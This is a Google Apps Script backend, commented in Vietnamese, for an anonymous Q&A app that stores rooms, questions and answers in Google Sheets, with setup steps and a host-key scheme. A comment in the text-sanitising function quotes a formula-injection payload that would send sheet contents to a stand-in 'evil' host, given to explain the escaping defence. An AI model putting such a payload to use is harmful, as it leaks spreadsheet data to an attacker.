/**
 * ============================================================
 *  GOOGLE APPS SCRIPT – backend cho app "Trả lời ẩn danh"
 *  (gốc: docs/style/apps-script-template.js của đội App Creator)
 * ============================================================
 *  Chức năng:
 *   1) Người tham gia (điện thoại), KHÔNG cần khóa:
 *        GET  ?action=ping                         đánh thức script lúc tải trang
 *        GET  ?action=getRoom&room=1234            trạng thái phòng + câu hỏi hiện tại
 *        GET  ?action=heartbeat&room=1234&device=… như getRoom, kèm "tôi còn đây" (đếm người đang tham gia)
 *        POST {action:'submitAnswer', room, device, q, text}   gửi một câu trả lời (một máy một câu mỗi câu hỏi)
 *   2) Người dẫn (màn chiếu), MỌI lời gọi là POST kèm key (khóa không nằm trong URL):
 *        createRoom · getState · setQuestion · closeRoom · deleteRoom
 *   3) GET không có action → "public_read_disabled": không ai đọc được câu trả lời qua link.
 *
 *  Dữ liệu nằm ở 3 tab (script tự tạo): Rooms · Questions · Answers (đúng 5 cột:
 *  Thời gian · Mã phòng · Số câu · deviceId · Nội dung). Không IP, không tên, không user-agent.
 *  "Người đang tham gia" đếm bằng bộ nhớ đệm của script (tự quên sau 60 giây), không ghi Sheet.
 *
 *  ------------------------------------------------------------
 *  HƯỚNG DẪN CÀI ĐẶT (anh Thông tự làm trên tài khoản của anh,
 *  khoảng 10 phút, làm đúng thứ tự)
 *  ------------------------------------------------------------
 *  BƯỚC 1 – Tạo Google Sheet
 *    1.1 Vào https://sheets.new (đăng nhập bsngvanthong@gmail.com).
 *    1.2 Đặt tên file, ví dụ "Trả lời ẩn danh".
 *    1.3 Không cần tạo tab hay gõ tiêu đề cột: script tự tạo 3 tab Rooms, Questions,
 *        Answers với tiêu đề và tự đặt cột Mã phòng thành Văn bản thuần (để mã 0042
 *        không bị đổi thành 42). Tab "Trang tính1" có sẵn cứ để đó, không sao.
 *
 *  BƯỚC 2 – Dán script
 *    2.1 Trên Sheet: menu Tiện ích mở rộng (Extensions) → Apps Script.
 *    2.2 Trong file Code.gs, xóa hết code mẫu, dán TOÀN BỘ file này vào.
 *    2.3 Bấm biểu tượng đĩa mềm (Lưu) hoặc Ctrl+S.
 *
 *  BƯỚC 3 – Tạo khóa người dẫn (chỉ anh có khóa này mới tạo/điều khiển/xóa phòng)
 *    3.1 Ở thanh công cụ, ô chọn hàm (cạnh nút Chạy/Run) chọn  makeHostKey  rồi bấm Chạy.
 *    3.2 Lần đầu Google hỏi quyền: Xem lại quyền → chọn tài khoản → Nâng cao
 *        (Advanced) → Đi tới … (không an toàn) → Cho phép. Đây là script của
 *        chính anh nên cảnh báo này là bình thường.
 *    3.3 Mở Nhật ký thực thi (Execution log) ở dưới: thấy dòng
 *        "Link màn dẫn: https://…/host.html?key=…". Chép link này, lưu vào nơi kín
 *        (bookmark riêng, ghi chú). GIỮ NHƯ MẬT KHẨU: ai có link là điều khiển được phòng.
 *        Khóa nằm trong Thuộc tính tập lệnh (Script Properties), không nằm trong code.
 *    3.4 Lỡ lộ link? Chạy lại makeHostKey → khóa cũ hết hiệu lực ngay, lấy link mới.
 *        Muốn xem lại link hiện tại mà không đổi khóa: chạy hàm  showHostLink .
 *
 *  BƯỚC 4 – Tạo tab và chạy thử trong editor (nên làm)
 *    4.1 Chọn hàm  setup_  → Chạy: quay lại Sheet sẽ thấy 3 tab Rooms, Questions, Answers.
 *    4.2 Chọn hàm  test_  → Chạy. Nhật ký thực thi hiện các dòng "test_: …" và cuối cùng
 *        "test_: XONG" là được. Phòng thử đã được xóa tự động.
 *
 *  BƯỚC 5 – Triển khai thành Ứng dụng web
 *    5.1 Nút Triển khai (Deploy) ở góc trên phải → Triển khai mới (New deployment).
 *    5.2 Bấm bánh răng cạnh "Chọn loại" → Ứng dụng web (Web app).
 *    5.3 Mô tả: gõ gì cũng được, ví dụ "v1".
 *        Thực thi với tư cách (Execute as): Tôi (Me).
 *        Ai có quyền truy cập (Who has access): Bất kỳ ai (Anyone).
 *        (Phải là "Bất kỳ ai", KHÔNG phải "Bất kỳ ai có tài khoản Google",
 *        nếu không điện thoại người tham gia sẽ bị bắt đăng nhập.)
 *    5.4 Bấm Triển khai. Nếu hỏi quyền thì cho phép như bước 3.2.
 *    5.5 Chép dòng  URL ứng dụng web  (dạng https://script.google.com/macros/s/.../exec).
 *        Đó là GOOGLE_SCRIPT_URL. Gửi URL này cho đội để dán vào js/config.js.
 *
 *  BƯỚC 6 – Kiểm tra nhanh trên trình duyệt
 *    6.1 Mở  <URL>?action=ping  → thấy {"result":"success","pong":true,"version":"1"}
 *    6.2 Mở  <URL>?action=getRoom&room=0000  → thấy "room_not_found" (chưa có phòng, đúng ý).
 *    6.3 Mở  <URL>  (không có gì phía sau) → thấy "public_read_disabled": đúng ý,
 *        nghĩa là không ai xem được câu trả lời qua đường link.
 *
 *  LẦN SAU SỬA CODE: dán code mới → Lưu → Triển khai → Quản lý bản triển khai
 *    → biểu tượng bút chì → Phiên bản: Phiên bản mới → Triển khai.
 *    URL giữ nguyên, không phải sửa config.js. Khóa người dẫn cũng giữ nguyên.
 *
 *  NẾU ĐÃ TẠO TAB BẰNG BẢN CŨ (trước khi có dòng này): chọn cả cột E của tab Answers và
 *  cột C của tab Questions → Định dạng (Format) → Số (Number) → Văn bản thuần (Plain text),
 *  để câu trả lời như "1/2", "100%", "7:30", "TRUE" không bị Sheets tự đổi thành ngày/số/đúng-sai.
 *  Tab tạo mới bằng bản này thì script tự đặt, không phải làm gì.
 *
 *  LƯU Ý KHI DÙNG: điều khiển phòng bằng màn dẫn, đừng sửa tay tab Rooms giữa buổi
 *  (script nhớ trạng thái phòng trong bộ đệm tới 6 giờ). Sau buổi, tải CSV rồi
 *  "Xóa toàn bộ phòng" trên màn dẫn để Sheet gọn.
 *
 *  Phía web gửi bằng:
 *    fetch(URL, { method: 'POST', headers: { 'Content-Type': 'text/plain;charset=utf-8' }, body: JSON.stringify(payload) })
 *  (Content-Type text/plain để tránh preflight CORS.)
 * ============================================================
 */

/* ===== Hằng số (khớp tech design mục 4.12) ===== */

var SHEETS = { rooms: 'Rooms', questions: 'Questions', answers: 'Answers' };
var HEADERS = {
  Rooms:     ['Mã phòng', 'Thời gian tạo', 'Câu hiện tại', 'Số câu hỏi', 'Trạng thái', 'Cập nhật lúc'],
  Questions: ['Mã phòng', 'Số câu', 'Nội dung'],
  Answers:   ['Thời gian', 'Mã phòng', 'Số câu', 'deviceId', 'Nội dung']   // ĐÚNG 5 cột theo PRD, không thêm
};
// Cột đặt định dạng Văn bản thuần (@) ngay khi tạo tab: mã phòng, deviceId và các cột giờ dạng chữ
// Cột nội dung (Questions C, Answers E) cũng là Văn bản thuần: "1/2", "100%", "7:30", "TRUE" giữ nguyên chữ.
var TEXT_COLUMNS = { Rooms: ['A:A', 'B:B', 'F:F'], Questions: ['A:A', 'C:C'], Answers: ['A:A', 'B:B', 'D:D', 'E:E'] };

var ROOM_RE = /^\d{4}$/;              // mã phòng 4 chữ số (đổi thành 6 số: sửa đây + ROOM_CODE_LENGTH)
var ROOM_CODE_LENGTH = 4;
var DEVICE_RE = /^[a-z0-9]{8,32}$/;   // deviceId sinh trên máy, không suy ra người
var ANSWER_MAX = 280;                 // ký tự (đếm theo code point) mỗi câu trả lời
var QUESTION_MAX = 500;
var QUESTIONS_MAX = 50;
var MAX_ANSWERS_PER_ROOM = 500;       // chống spam: quá thì trả room_full
var ROOM_TTL_HOURS = 24;              // phòng mở quá lâu tự đóng
var PRESENCE_TTL_SEC = 60;            // "đang tham gia" = có heartbeat trong 60 giây
var PRESENCE_CACHE_SEC = 120;
var CACHE_ROOM_SEC = 21600;           // 6 giờ
var LOCK_WAIT_MS = 8000;
var ALLOW_PUBLIC_READ = false;        // GET không action → public_read_disabled
var PRESENCE_MAX_DEVICES = 300;       // tối đa mục trong pr:<room>; quá thì bỏ mục cũ nhất (giữ cache nhỏ)
var DEBUG = false;                    // true → server_error kèm detail; mặc định chỉ ghi Logger
var TIME_ZONE = 'Asia/Ho_Chi_Minh';
var API_VERSION = '1';
var HOST_KEY_PROP = 'HOST_KEY';
var HOST_KEY_LENGTH = 32;
var PUBLIC_URL = 'https://ditruyenhungvuong.github.io/tra-loi-an-danh/';   // chỉ để in link trong makeHostKey

/* ===== Tiện ích chung ===== */

/** Giờ hiện tại (ms). Tách riêng để test thay đồng hồ giả. Mọi mốc thời gian là giờ server. */
function now_() { return Date.now(); }

function formatDate_(d) { return Utilities.formatDate(d, TIME_ZONE, 'HH:mm:ss dd/MM/yyyy'); }
function nowStr_() { return formatDate_(new Date(now_())); }

/** 'HH:mm:ss dd/MM/yyyy' (giờ VN) → epoch ms; sai khuôn → NaN. */
function parseDate_(s) {
  var m = /^(\d\d):(\d\d):(\d\d) (\d\d)\/(\d\d)\/(\d{4})$/.exec(String(s == null ? '' : s));
  if (!m) return NaN;
  return Date.UTC(+m[6], +m[5] - 1, +m[4], +m[1] - 7, +m[2], +m[3]);
}

/** Ô Sheet về chuỗi: Date (Sheets lỡ đổi) → đúng khuôn giờ; null → ''. */
function cellStr_(v) {
  if (v == null) return '';
  if (Object.prototype.toString.call(v) === '[object Date]') return formatDate_(v);
  return String(v);
}

/** Đếm ký tự theo code point (emoji = 1), khớp cách client đếm. */
function len_(s) { return String(s).replace(/[\uD800-\uDBFF][\uDC00-\uDFFF]/g, '_').length; }

/**
 * AN TOÀN BẮT BUỘC: URL Web App là public, ai cũng POST được. Sheets coi chuỗi bắt đầu bằng "="
 * là công thức → kẻ xấu gửi '=IMPORTXML("https://evil/?d="&JOIN(";";A2:B500);"//a")' là rút được
 * cả Sheet khi chủ Sheet mở file. Mọi chuỗi tự do (câu hỏi, câu trả lời) đi qua đây trước khi ghi;
 * mã phòng và deviceId đã qua regex nên không thể bắt đầu bằng ký tự lạ.
 */
function safeText_(s) {
  var t = String(s == null ? '' : s);
  var c = t.charCodeAt(0);
  return (/^[=+\-@]/.test(t) || c === 9 || c === 13) ? "'" + t : t;
}

function err_(code, extra) {
  var o = { result: 'error', error: code };
  if (extra) for (var k in extra) o[k] = extra[k];
  return o;
}

/** Lỗi bất ngờ: ghi Logger, trả server_error trần; chỉ kèm detail khi DEBUG = true (không lộ nội bộ ra public). */
function serverError_(e) {
  var detail = String(e && e.message ? e.message : e).slice(0, 200);
  try { Logger.log('server_error: ' + detail + (e && e.stack ? '\n' + String(e.stack).slice(0, 500) : '')); } catch (ignored) {}
  return DEBUG ? err_('server_error', { detail: detail }) : err_('server_error');
}

/** JSON hoặc JSONP (?callback=…); tên hàm callback lọc còn chữ, số, _ $ . */
function json_(obj, callback) {
  var text = JSON.stringify(obj);
  var fn = String(callback == null ? '' : callback).replace(/[^0-9A-Za-z_$.]/g, '');
  if (fn) {
    return ContentService.createTextOutput(fn + '(' + text + ');').setMimeType(ContentService.MimeType.JAVASCRIPT);
  }
  return ContentService.createTextOutput(text).setMimeType(ContentService.MimeType.JSON);
}

/* ===== Validate đầu vào ===== */

function vRoom_(v) { var s = String(v == null ? '' : v).trim(); return ROOM_RE.test(s) ? s : null; }
function vDevice_(v) { var s = String(v == null ? '' : v).trim(); return DEVICE_RE.test(s) ? s : null; }
/** Số nguyên ≥ 1 (nhận "2" dạng chuỗi), khác → null. */
function vInt_(v) {
  if (v == null || v === '' || typeof v === 'boolean') return null;
  var n = Number(v);
  return (isFinite(n) && n === Math.floor(n) && n >= 1) ? n : null;
}

/* ===== Sheet ===== */

function ss_() { return SpreadsheetApp.getActiveSpreadsheet(); }

/** Lấy tab theo tên; chưa có thì tạo kèm tiêu đề, màu navy nhạt, đóng băng hàng 1, cột mã = Văn bản thuần. */
function sheet_(name) {
  var ss = ss_();
  var sh = ss.getSheetByName(name);
  if (!sh) sh = ss.insertSheet(name);
  if (sh.getLastRow() === 0) {
    var headers = HEADERS[name];
    sh.appendRow(headers);
    sh.getRange(1, 1, 1, headers.length).setFontWeight('bold').setBackground('#E3EAF3').setFontColor('#1F3A5F');
    sh.setFrozenRows(1);
    (TEXT_COLUMNS[name] || []).forEach(function (a1) { sh.getRange(a1).setNumberFormat('@'); });
  }
  return sh;
}

function ensureSheets_() {
  return { rooms: sheet_(SHEETS.rooms), questions: sheet_(SHEETS.questions), answers: sheet_(SHEETS.answers) };
}

/** Đọc mọi dòng dữ liệu (bỏ tiêu đề) của ncols cột đầu, một lần getValues. */
function readRows_(sh, ncols) {
  var last = sh.getLastRow();
  if (last < 2) return [];
  return sh.getRange(2, 1, last - 1, ncols).getValues();
}

/** Số dòng (1-based) của phòng trong tab Rooms, tìm từ dưới lên; 0 nếu không có. */
function findRoomRow_(sh, code) {
  var last = sh.getLastRow();
  if (last < 2) return 0;
  var col = sh.getRange(2, 1, last - 1, 1).getValues();
  for (var i = col.length - 1; i >= 0; i--) if (cellStr_(col[i][0]) === code) return i + 2;
  return 0;
}

/** Xóa mọi dòng có cột `col` = code, từ dưới lên theo khối liên tiếp. Trả số dòng đã xóa. */
function deleteRowsByCode_(sh, col, code) {
  var last = sh.getLastRow();
  if (last < 2) return 0;
  var vals = sh.getRange(2, col, last - 1, 1).getValues();
  var rows = [];
  for (var i = 0; i < vals.length; i++) if (cellStr_(vals[i][0]) === code) rows.push(i + 2);
  var n = 0, j = rows.length - 1;
  while (j >= 0) {
    var end = rows[j], start = end;
    while (j > 0 && rows[j - 1] === start - 1) { j--; start--; }
    sh.deleteRows(start, end - start + 1);
    n += end - start + 1;
    j--;
  }
  return n;
}

/* ===== Cache: trạng thái phòng, "ai đang có mặt", khóa đã trả lời ===== */

function cache_() { return CacheService.getScriptCache(); }

function isExpired_(st) {
  var t = parseDate_(st.createdAt);
  return !isNaN(t) && now_() - t > ROOM_TTL_HOURS * 3600 * 1000;
}

/** Đọc phòng từ Sheet (nguồn sự thật): dòng cuối cùng có mã đó trong Rooms + câu hỏi trong Questions. */
function readRoomFromSheet_(code) {
  var rows = readRows_(sheet_(SHEETS.rooms), 6);
  var found = null;
  for (var i = rows.length - 1; i >= 0; i--) if (cellStr_(rows[i][0]) === code) { found = rows[i]; break; }
  if (!found) return null;
  var questions = [];
  readRows_(sheet_(SHEETS.questions), 3).forEach(function (r) {
    if (cellStr_(r[0]) === code) questions.push({ index: Number(r[1]), text: cellStr_(r[2]) });
  });
  questions.sort(function (a, b) { return a.index - b.index; });
  return {
    code: code,
    status: cellStr_(found[4]) === 'closed' ? 'closed' : 'open',
    currentIndex: Number(found[2]) || 1,
    questionCount: Number(found[3]) || questions.length,
    createdAt: cellStr_(found[1]),
    questions: questions
  };
}

/** Trạng thái phòng: cache rs:<code> → trượt thì đọc Sheet và ghi lại cache. Phòng mở quá 24 h coi như closed. */
function roomState_(code) {
  var st = null;
  var raw = cache_().get('rs:' + code);
  if (raw) { try { st = JSON.parse(raw); } catch (ignored) { st = null; } }
  if (!st) {
    st = readRoomFromSheet_(code);
    if (st) putRoomState_(st);
  }
  if (st && st.status === 'open' && isExpired_(st)) st.status = 'closed';
  return st;
}
/** Ghi cache; cache lỗi (quá 100 KB, dịch vụ trục trặc) không được làm hỏng response – Sheet vẫn là nguồn sự thật. */
function putRoomState_(st) {
  try { cache_().put('rs:' + st.code, JSON.stringify(st), CACHE_ROOM_SEC); } catch (ignored) {}
}
function dropRoomState_(code) { cache_().remove('rs:' + code); }

function readPresence_(code) {
  var raw = cache_().get('pr:' + code);
  if (!raw) return {};
  try { return JSON.parse(raw) || {}; } catch (ignored) { return {}; }
}
/**
 * Ghi "device còn đây" (không lock: ghi đè chéo mất một nhịp cũng tự lành sau 3,5 s).
 * Bỏ mục quá 60 s; quá PRESENCE_MAX_DEVICES thì bỏ mục cũ nhất. Cache lỗi → nuốt, heartbeat vẫn trả success.
 */
function touchPresence_(code, device) {
  try {
    var nowSec = Math.floor(now_() / 1000);
    var map = readPresence_(code), keep = [], order = 0;
    delete map[device];                  // đưa device hiện tại xuống cuối (mới nhất theo thứ tự chèn)
    map[device] = nowSec;
    for (var d in map) if (nowSec - map[d] <= PRESENCE_TTL_SEC) keep.push([d, map[d], order++]);
    if (keep.length > PRESENCE_MAX_DEVICES) {
      // mới nhất trước: theo giây, hòa thì theo thứ tự chèn (cùng giây vẫn giữ máy vừa gọi)
      keep.sort(function (a, b) { return (b[1] - a[1]) || (b[2] - a[2]); });
      keep = keep.slice(0, PRESENCE_MAX_DEVICES);
    }
    var out = {};
    for (var i = 0; i < keep.length; i++) out[keep[i][0]] = keep[i][1];
    cache_().put('pr:' + code, JSON.stringify(out), PRESENCE_CACHE_SEC);
  } catch (ignored) {}
}
function countPresence_(code) {
  var nowSec = Math.floor(now_() / 1000);
  var map = readPresence_(code), n = 0;
  for (var d in map) if (nowSec - map[d] <= PRESENCE_TTL_SEC) n++;
  return n;
}
function dropPresence_(code) { cache_().remove('pr:' + code); }

/* ===== Khóa người dẫn và lock ===== */

/** '' nếu đúng khóa; 'host_key_not_set' khi chưa chạy makeHostKey; 'host_key_invalid' khi sai. */
function checkHostKey_(key) {
  var expected = PropertiesService.getScriptProperties().getProperty(HOST_KEY_PROP);
  if (!expected) return 'host_key_not_set';
  var k = typeof key === 'string' ? key : '';
  if (k.length < 16 || k.length > 64 || k !== expected) return 'host_key_invalid';
  return '';
}

/** Lock bao quanh mọi thao tác ghi Sheet; không lấy được trong 8 s → busy. heartbeat/getRoom/getState không lock. */
function withLock_(fn) {
  var lock = LockService.getScriptLock();
  if (!lock.tryLock(LOCK_WAIT_MS)) return err_('busy');
  try { return fn(); } finally { try { lock.releaseLock(); } catch (ignored) {} }
}

/* ===== Hình dạng trả về ===== */

function roomView_(st) {
  return { code: st.code, status: st.status, currentIndex: st.currentIndex, questionCount: st.questionCount, createdAt: st.createdAt };
}
function currentQuestion_(st) {
  if (st.status !== 'open') return null;
  var q = st.questions[st.currentIndex - 1];
  return q ? { index: q.index, text: q.text } : null;
}
/** Toàn bộ câu trả lời của phòng theo thứ tự dòng (= thứ tự nhận). Không bao giờ trả qua GET. */
function answersOf_(code) {
  var out = [];
  readRows_(sheet_(SHEETS.answers), 5).forEach(function (r) {
    if (cellStr_(r[1]) !== code) return;
    var q = Number(r[2]), device = cellStr_(r[3]);
    out.push({ id: code + '|' + q + '|' + device, q: q, text: cellStr_(r[4]), at: cellStr_(r[0]) });
  });
  return out;
}

/* ===== Hành động người tham gia ===== */

function actionPing_() { return { result: 'success', pong: true, version: API_VERSION }; }

/** getRoom (touch=false) và heartbeat (touch=true): cùng response; heartbeat ghi thêm presence khi phòng mở. */
function actionGetRoom_(p, touch) {
  var code = vRoom_(p.room);
  if (!code) return err_('room_invalid');
  var device = null;
  if (touch) { device = vDevice_(p.device); if (!device) return err_('device_invalid'); }
  var st = roomState_(code);
  if (!st) return err_('room_not_found');
  if (touch && st.status === 'open') touchPresence_(code, device);
  return { result: 'success', room: roomView_(st), currentQuestion: currentQuestion_(st), maxLen: ANSWER_MAX };
}

/**
 * submitAnswer: validate → trạng thái phòng (cache) → status, q === currentIndex → cache ak: →
 * LOCK: đọc Answers!B2:D một lần (đếm room_full, tìm trùng) → appendRow → cache ak: → thả lock.
 * Gửi lại luôn ra already_answered, không bao giờ hai dòng.
 */
function actionSubmitAnswer_(d) {
  var code = vRoom_(d.room);
  if (!code) return err_('room_invalid');
  var device = vDevice_(d.device);
  if (!device) return err_('device_invalid');
  var q = vInt_(d.q);
  if (!q) return err_('question_invalid');
  var text = String(d.text == null ? '' : d.text).trim();   // bỏ khoảng trắng hai đầu, giữ xuống dòng bên trong
  if (!text) return err_('text_required');
  if (len_(text) > ANSWER_MAX) return err_('text_too_long');

  var st = roomState_(code);
  if (!st) return err_('room_not_found');
  if (st.status !== 'open') return err_('room_closed');
  if (q > st.questionCount) return err_('question_invalid');
  if (q !== st.currentIndex) return err_('question_changed', { currentIndex: st.currentIndex, currentQuestion: currentQuestion_(st) });

  var id = code + '|' + q + '|' + device;
  if (cache_().get('ak:' + id)) return err_('already_answered');

  return withLock_(function () {
    var sh = sheet_(SHEETS.answers);
    var last = sh.getLastRow(), count = 0, dup = false;
    if (last >= 2) {
      var rows = sh.getRange(2, 2, last - 1, 3).getValues();   // B: mã phòng, C: số câu, D: deviceId
      for (var i = 0; i < rows.length; i++) {
        if (cellStr_(rows[i][0]) !== code) continue;
        count++;
        if (Number(rows[i][1]) === q && cellStr_(rows[i][2]) === device) dup = true;
      }
    }
    if (dup) { cache_().put('ak:' + id, '1', CACHE_ROOM_SEC); return err_('already_answered'); }
    if (count >= MAX_ANSWERS_PER_ROOM) return err_('room_full');
    var at = nowStr_();
    sh.appendRow([at, code, q, device, safeText_(text)]);
    cache_().put('ak:' + id, '1', CACHE_ROOM_SEC);
    return { result: 'success', id: id, q: q, at: at };
  });
}

/* ===== Hành động người dẫn (đều cần key) ===== */

function actionCreateRoom_(d) {
  var ke = checkHostKey_(d.key);
  if (ke) return err_(ke);
  var list = Array.isArray(d.questions) ? d.questions : [];
  var qs = [];
  for (var i = 0; i < list.length; i++) {
    var t = String(list[i] == null ? '' : list[i]).trim();
    if (t) qs.push(t);                       // bỏ dòng trống
  }
  if (!qs.length) return err_('questions_required');
  if (qs.length > QUESTIONS_MAX) return err_('questions_too_many');
  for (var j = 0; j < qs.length; j++) if (len_(qs[j]) > QUESTION_MAX) return err_('question_too_long');

  return withLock_(function () {
    var rooms = sheet_(SHEETS.rooms);
    var rows = readRows_(rooms, 6);
    var used = {}, at = nowStr_();
    // Dọn nhà: phòng open tạo quá ROOM_TTL_HOURS → closed
    for (var r = 0; r < rows.length; r++) {
      var c = cellStr_(rows[r][0]);
      used[c] = true;
      if (cellStr_(rows[r][4]) === 'open') {
        var t = parseDate_(cellStr_(rows[r][1]));
        if (!isNaN(t) && now_() - t > ROOM_TTL_HOURS * 3600 * 1000) {
          rooms.getRange(r + 2, 5, 1, 2).setValues([['closed', at]]);
          dropRoomState_(c); dropPresence_(c);
        }
      }
    }
    // Sinh mã: không trùng BẤT KỲ dòng nào trong Rooms (kể cả closed) để Questions/Answers không lẫn phòng cũ
    var code = null;
    for (var k = 0; k < 20 && !code; k++) {
      var cand = randomCode_();
      if (!used[cand]) code = cand;
    }
    if (!code) return err_('code_exhausted');

    rooms.appendRow([code, at, 1, qs.length, 'open', at]);
    var qsh = sheet_(SHEETS.questions);
    var vals = qs.map(function (t, i) { return [code, i + 1, safeText_(t)]; });
    qsh.getRange(qsh.getLastRow() + 1, 1, vals.length, 3).setValues(vals);

    var st = {
      code: code, status: 'open', currentIndex: 1, questionCount: qs.length, createdAt: at,
      questions: vals.map(function (v) { return { index: v[1], text: v[2] }; })
    };
    putRoomState_(st);
    dropPresence_(code);
    return { result: 'success', room: roomView_(st), questions: st.questions };
  });
}

function randomCode_() {
  var s = '';
  for (var i = 0; i < ROOM_CODE_LENGTH; i++) s += Math.floor(Math.random() * 10);
  return s;
}

/** Request gộp của màn dẫn: trạng thái + câu hỏi + câu trả lời mới kể từ `since` + số người. Không lock. */
function actionGetState_(d) {
  var ke = checkHostKey_(d.key);
  if (ke) return err_(ke);
  var code = vRoom_(d.room);
  if (!code) return err_('room_invalid');
  var st = roomState_(code);
  if (!st) return err_('room_not_found');
  var since = Number(d.since);
  since = (isFinite(since) && since >= 0) ? Math.floor(since) : 0;
  var list = answersOf_(code);
  var reset = list.length < since;         // ai đó xóa dòng tay trên Sheet → client thay toàn bộ
  return {
    result: 'success',
    room: roomView_(st),
    questions: st.questions,
    currentQuestion: currentQuestion_(st),
    answersNew: reset ? list : list.slice(since),
    cursor: list.length,
    reset: reset,
    counts: { participants: countPresence_(code), answersTotal: list.length }
  };
}

function actionSetQuestion_(d) {
  var ke = checkHostKey_(d.key);
  if (ke) return err_(ke);
  var code = vRoom_(d.room);
  if (!code) return err_('room_invalid');
  var index = vInt_(d.index);
  if (!index) return err_('question_invalid');
  var st = roomState_(code);
  if (!st) return err_('room_not_found');
  if (st.status !== 'open') return err_('room_closed');
  if (index > st.questionCount) return err_('question_invalid');
  return withLock_(function () {
    var rooms = sheet_(SHEETS.rooms);
    var row = findRoomRow_(rooms, code);
    if (!row) { dropRoomState_(code); return err_('room_not_found'); }
    var at = nowStr_();
    rooms.getRange(row, 3).setValue(index);
    rooms.getRange(row, 6).setValue(at);
    st.currentIndex = index;
    putRoomState_(st);
    return { result: 'success', room: roomView_(st), currentQuestion: currentQuestion_(st) };
  });
}

function actionCloseRoom_(d) {
  var ke = checkHostKey_(d.key);
  if (ke) return err_(ke);
  var code = vRoom_(d.room);
  if (!code) return err_('room_invalid');
  var st = roomState_(code);
  if (!st) return err_('room_not_found');
  return withLock_(function () {
    var rooms = sheet_(SHEETS.rooms);
    var row = findRoomRow_(rooms, code);
    if (!row) { dropRoomState_(code); return err_('room_not_found'); }
    rooms.getRange(row, 5, 1, 2).setValues([['closed', nowStr_()]]);   // đóng rồi đóng lại vẫn success
    st.status = 'closed';
    putRoomState_(st);
    dropPresence_(code);
    return { result: 'success', room: roomView_(st), counts: { answersTotal: answersOf_(code).length } };
  });
}

function actionDeleteRoom_(d) {
  var ke = checkHostKey_(d.key);
  if (ke) return err_(ke);
  var code = vRoom_(d.room);
  if (!code) return err_('room_invalid');
  return withLock_(function () {
    // Xóa cache ak: của mọi câu trả lời trong phòng TRƯỚC khi xóa dòng, kẻo phòng mới trúng mã
    // trong 6 giờ làm device cũ bị already_answered giả (mất câu trả lời im lặng).
    dropAnsweredKeys_(code);
    var deleted = {
      rooms: deleteRowsByCode_(sheet_(SHEETS.rooms), 1, code),
      questions: deleteRowsByCode_(sheet_(SHEETS.questions), 1, code),
      answers: deleteRowsByCode_(sheet_(SHEETS.answers), 2, code)
    };
    dropRoomState_(code);
    dropPresence_(code);
    return { result: 'success', deleted: deleted };   // phòng không có → vẫn success với số 0
  });
}

/** Đọc Answers!B2:D của phòng, ghép khóa ak:room|q|device và xóa khỏi cache (theo lô 100). */
function dropAnsweredKeys_(code) {
  var sh = sheet_(SHEETS.answers);
  var last = sh.getLastRow();
  if (last < 2) return;
  var rows = sh.getRange(2, 2, last - 1, 3).getValues();
  var keys = [];
  for (var i = 0; i < rows.length; i++) {
    if (cellStr_(rows[i][0]) === code) keys.push('ak:' + code + '|' + Number(rows[i][1]) + '|' + cellStr_(rows[i][2]));
  }
  try {
    var c = cache_();
    for (var j = 0; j < keys.length; j += 100) c.removeAll(keys.slice(j, j + 100));
  } catch (ignored) {}
}

/* ===== Điểm vào Web App ===== */

/** GET: ping · getRoom · heartbeat (đều hỗ trợ ?callback= JSONP). Không action → public_read_disabled. */
function doGet(e) {
  var p = (e && e.parameter) || {};
  var callback = p.callback || '';
  try {
    var action = String(p.action == null ? '' : p.action).trim();
    var out;
    if (!action) out = ALLOW_PUBLIC_READ ? err_('unknown_action') : err_('public_read_disabled');
    else if (action === 'ping') out = actionPing_();
    else if (action === 'getRoom') out = actionGetRoom_(p, false);
    else if (action === 'heartbeat') out = actionGetRoom_(p, true);
    else out = err_('unknown_action');
    return json_(out, callback);
  } catch (err) {
    return json_(serverError_(err), callback);
  }
}

/** POST text/plain JSON {action, …}: submitAnswer (không khóa) · createRoom · getState · setQuestion · closeRoom · deleteRoom (có khóa). */
function doPost(e) {
  try {
    var body = e && e.postData && e.postData.contents;
    if (!body) return json_(err_('no_data'));
    var d;
    try { d = JSON.parse(body); } catch (x) { return json_(err_('bad_json')); }
    if (!d || typeof d !== 'object' || Array.isArray(d)) return json_(err_('bad_json'));
    var action = String(d.action == null ? '' : d.action).trim();
    var out;
    switch (action) {
      case 'submitAnswer': out = actionSubmitAnswer_(d); break;
      case 'createRoom':   out = actionCreateRoom_(d); break;
      case 'getState':     out = actionGetState_(d); break;
      case 'setQuestion':  out = actionSetQuestion_(d); break;
      case 'closeRoom':    out = actionCloseRoom_(d); break;
      case 'deleteRoom':   out = actionDeleteRoom_(d); break;
      default:             out = err_('unknown_action');
    }
    return json_(out);
  } catch (err) {
    return json_(serverError_(err));
  }
}

/* ===== Hàm anh Thông chạy trong editor ===== */

/** Tạo 3 tab với tiêu đề và định dạng. Chạy lại không hại gì. */
function setup_() {
  ensureSheets_();
  Logger.log('setup_: đã có 3 tab ' + SHEETS.rooms + ', ' + SHEETS.questions + ', ' + SHEETS.answers + '.');
  if (!PropertiesService.getScriptProperties().getProperty(HOST_KEY_PROP)) {
    Logger.log('setup_: CHƯA có khóa người dẫn. Chạy hàm makeHostKey rồi chép link.');
  } else {
    Logger.log('setup_: khóa người dẫn đã có. Chạy showHostLink để xem link.');
  }
}

/**
 * Sinh khóa người dẫn mới, lưu vào Script Properties (không nằm trong code), in link host.
 * Chạy lại = đổi khóa, link cũ hết hiệu lực (ADR 0003).
 */
function makeHostKey() {
  var alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var seed = (Utilities.getUuid() + Utilities.getUuid()).replace(/-/g, '');   // thêm entropy ngoài Math.random
  var key = '';
  for (var i = 0; i < HOST_KEY_LENGTH; i++) {
    var n = (parseInt(seed.charAt(i % seed.length), 16) + Math.floor(Math.random() * alphabet.length)) % alphabet.length;
    key += alphabet.charAt(n);
  }
  PropertiesService.getScriptProperties().setProperty(HOST_KEY_PROP, key);
  Logger.log('Đã tạo khóa người dẫn mới (khóa cũ nếu có đã hết hiệu lực).');
  Logger.log('Link màn dẫn: ' + PUBLIC_URL + 'host.html?key=' + key);
  Logger.log('Giữ link này như mật khẩu. Lỡ lộ thì chạy lại makeHostKey.');
  return key;
}

/** In lại link host với khóa hiện tại, không đổi khóa. */
function showHostLink() {
  var key = PropertiesService.getScriptProperties().getProperty(HOST_KEY_PROP);
  if (!key) { Logger.log('Chưa có khóa. Chạy makeHostKey trước.'); return ''; }
  Logger.log('Link màn dẫn: ' + PUBLIC_URL + 'host.html?key=' + key);
  return key;
}

